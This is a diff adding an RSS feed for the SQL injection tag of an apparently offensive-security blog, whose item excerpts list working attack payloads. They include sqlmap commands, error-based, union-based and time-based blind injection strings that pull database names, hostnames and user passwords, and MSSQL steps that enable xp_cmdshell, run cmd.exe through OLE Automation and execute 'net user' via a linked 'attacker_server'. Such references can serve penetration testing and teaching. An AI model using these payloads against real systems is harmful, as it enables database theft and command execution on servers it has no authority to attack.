@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SQLi on ByteShifters</title>
+    <link>https://byteshifters.com/tags/sqli/</link>
+    <description>Recent content in SQLi on ByteShifters</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 03 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://byteshifters.com/tags/sqli/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Add custom Payloads Directly in SQLMap</title>
+      <link>https://byteshifters.com/posts/hacking/sql-injections/custom-payloads-in-sqlmap/</link>
+      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://byteshifters.com/posts/hacking/sql-injections/custom-payloads-in-sqlmap/</guid>
+      
+      <description>Example: Using --sql-query Simple Custom Payload sqlmap -u &amp;#34;http://example.com/vulnerable.php?id=1&amp;#34; --sql-query=&amp;#34;SELECT version()&amp;#34; Union-Based Custom Payload sqlmap -u &amp;#34;http://example.com/vulnerable.php?id=1&amp;#34; --sql-query=&amp;#34;UNION SELECT null, database(), user(), version()&amp;#34; Customizing Payloads with Tamper Scripts If you need more flexibility and want to systematically apply custom payloads, you can create a tamper script that modifies the default payloads used by SQLMap.
+Example: Custom Tamper Script Create a Custom Tamper Script
+Create a new Python file in the tamper directory of your SQLMap installation, for example, custom_payload_tamper.</description>
+      
+    </item>
+    
+    <item>
+      <title>Advanced SQLi Payloads and Techniques</title>
+      <link>https://byteshifters.com/posts/hacking/sql-injections/advanced-sqli-payloads-techniques/</link>
+      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://byteshifters.com/posts/hacking/sql-injections/advanced-sqli-payloads-techniques/</guid>
+      
+      <description>Error-Based SQL Injection Advanced Error Payloads &amp;#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- - Union-Based Injection Determining the Number of Columns &amp;#39; UNION SELECT NULL, NULL, NULL, NULL -- Extracting Data &amp;#39; UNION SELECT username, password, NULL, NULL FROM users -- Blind SQL Injection Boolean-Based Blind &amp;#39; AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) -- Time-Based Blind &amp;#39; AND IF(1=1, SLEEP(5), 0) -- Second-Order SQL Injection Injection in Profile Information Modify data stored in one place to affect queries executed elsewhere.</description>
+      
+    </item>
+    
+    <item>
+      <title>Extracting DB Name with Forced Errors</title>
+      <link>https://byteshifters.com/posts/hacking/sql-injections/extract-database-name-with-forced-errors/</link>
+      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://byteshifters.com/posts/hacking/sql-injections/extract-database-name-with-forced-errors/</guid>
+      
+      <description>MySQL Extracting DB Name Use error-based injection to extract the database name.
+&amp;#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- Extracting Hostname Use error-based injection to extract the hostname.
+&amp;#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@hostname), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- PostgreSQL Extracting Database Name Use error-based injection to extract the current database name.</description>
+      
+    </item>
+    
+    <item>
+      <title>Force Errors from Database to get SQLi</title>
+      <link>https://byteshifters.com/posts/hacking/sql-injections/force-errors-from-database-for-sqli/</link>
+      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://byteshifters.com/posts/hacking/sql-injections/force-errors-from-database-for-sqli/</guid>
+      
+      <description>MSSQL OLE Automation Procedures DECLARE @Object INT; EXEC sp_OACreate &amp;#39;WScript.Shell&amp;#39;, @Object OUTPUT; EXEC sp_OAMethod @Object, &amp;#39;Run&amp;#39;, NULL, &amp;#39;cmd.exe /c whoami &amp;gt; C:\output.txt&amp;#39;; This uses OLE Automation procedures to execute system commands.
+XP_CMD Shell with Privilege Escalation EXEC sp_configure &amp;#39;show advanced options&amp;#39;, 1; RECONFIGURE; EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; RECONFIGURE; EXEC xp_cmdshell &amp;#39;whoami&amp;#39;; This enables xp_cmdshell to execute system commands if it&amp;rsquo;s not already enabled.
+Linked Servers EXEC sp_addlinkedserver &amp;#39;attacker_server&amp;#39;; EXEC sp_addlinkedsrvlogin &amp;#39;attacker_server&amp;#39;, &amp;#39;false&amp;#39;, NULL, &amp;#39;username&amp;#39;, &amp;#39;password&amp;#39;; EXEC (&amp;#39;xp_cmdshell &amp;#39;&amp;#39;net user&amp;#39;&amp;#39;&amp;#39;) AT attacker_server; This technique uses linked servers to run commands on a different server.</description>
+      
+    </item>
+    
+    <item>
+      <title>Forcefully Generate Errors on Various DBMS</title>
+      <link>https://byteshifters.com/posts/hacking/sql-injections/force-errors-on-various-dbms/</link>
+      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://byteshifters.com/posts/hacking/sql-injections/force-errors-on-various-dbms/</guid>
+      
+      <description>Advanced Methods Use of Invalid Functions MySQL provides many functions that, when used incorrectly, can generate errors.
+&amp;#39; AND EXP(~(SELECT * FROM (SELECT 1) t)) -- Invalid Hexadecimal Conversion Using invalid hexadecimal values can cause errors.
+&amp;#39; AND 0xG1 -- Subqueries in SELECT Clause Use subqueries that return multiple rows in a single value context.
+&amp;#39; AND (SELECT * FROM (SELECT 1,2) t) = 1 -- PostgreSQL Invalid Regular Expression PostgreSQL&amp;rsquo;s regex functions can be used incorrectly to cause errors.</description>
+      
+    </item>
+    
+    <item>
+      <title>Other Advanced SQLi Payloads</title>
+      <link>https://byteshifters.com/posts/hacking/sql-injections/other-advanced-sqli-payloads/</link>
+      <pubDate>Thu, 03 Oct 2024 00:00:00 +0000</pubDate>
+      
+      <guid>https://byteshifters.com/posts/hacking/sql-injections/other-advanced-sqli-payloads/</guid>
+      
+      <description>1. Time-Based Blind SQL Injection with Complex Payloads Time-based blind SQL injection relies on database responses based on time delays. This method is effective when the application does not return visible errors.
+Payload: &amp;#39; AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&amp;gt;77,SLEEP(5),0)-- Explanation: This payload uses conditional statements to delay the response if the first character of the database name is greater than &amp;lsquo;M&amp;rsquo;. It helps in extracting data one character at a time.</description>
+      
+    </item>
+    
+  </channel>
+</rss>
